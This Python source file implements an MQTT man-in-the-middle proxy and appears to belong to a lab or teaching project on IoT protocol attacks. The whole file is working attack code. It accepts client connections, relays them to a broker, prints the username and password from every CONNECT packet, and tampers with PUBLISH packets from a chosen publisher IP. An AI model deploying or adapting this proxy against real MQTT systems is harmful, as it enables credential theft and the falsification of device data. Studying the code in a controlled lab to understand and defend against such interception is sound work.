import socket
import threading

from attacker.PacketParser import PacketParser
from attacker.PacketTamperer import PacketTamperer
from common.config import (
    ATTACKER_LISTEN_PORT,
    BROKER_IP,
    PORT,
    PUBLISHER_IP,
)


def process_buffer(buf, dst, tamper_for_ip, client_ip):
    """Parse all complete MQTT packets currently in buf, forward them, return leftover."""
    while True:
        packet, buf = PacketParser.try_parse(buf)
        if packet is None:
            return buf

        # Log credentials from CONNECT packets
        if client_ip is not None:
            connect_info = PacketParser.parse_connect(packet)
            if connect_info is not None:
                print(f"[Proxy] CONNECT from {client_ip}:")
                print(f"        client_id = {connect_info['client_id']}")
                print(f"        username  = {connect_info['username']}")
                print(f"        password  = {connect_info['password']}")
                print(
                    f"        proto     = {connect_info['protocol_name']} "
                    f"v{connect_info['protocol_level']}"
                )

        if tamper_for_ip is not None and client_ip == tamper_for_ip:
            packet = PacketTamperer.tamper_publish(packet)

        dst.sendall(packet)


def relay(src, dst, tamper_for_ip=None, client_ip=None):
    buf = b""
    try:
        while True:
            data = src.recv(4096)
            if not data:
                # Drain whatever is still in the buffer before exiting
                buf = process_buffer(buf, dst, tamper_for_ip, client_ip)
                break
            buf += data
            buf = process_buffer(buf, dst, tamper_for_ip, client_ip)
    except (ConnectionResetError, BrokenPipeError):
        pass
    finally:
        try:
            dst.shutdown(socket.SHUT_WR)
        except OSError:
            pass


def handle(client_sock, client_ip):
    try:
        broker_sock = socket.create_connection((BROKER_IP, PORT))
    except OSError as e:
        print(f"[Proxy] cannot connect to broker: {e}")
        client_sock.close()
        return

    t1 = threading.Thread(
        target=relay,
        args=(client_sock, broker_sock, PUBLISHER_IP, client_ip),
        daemon=True,
    )
    t2 = threading.Thread(
        target=relay,
        args=(broker_sock, client_sock, None, None),
        daemon=True,
    )
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    client_sock.close()
    broker_sock.close()


def main():
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", ATTACKER_LISTEN_PORT))
    server.listen(5)
    print(f"proxy listening on {ATTACKER_LISTEN_PORT}")
    try:
        while True:
            c, addr = server.accept()
            client_ip = addr[0]
            print(f"connection from {addr}")
            threading.Thread(target=handle, args=(c, client_ip), daemon=True).start()
    except KeyboardInterrupt:
        print("proxy shutting down")
    finally:
        server.close()


if __name__ == "__main__":
    main()
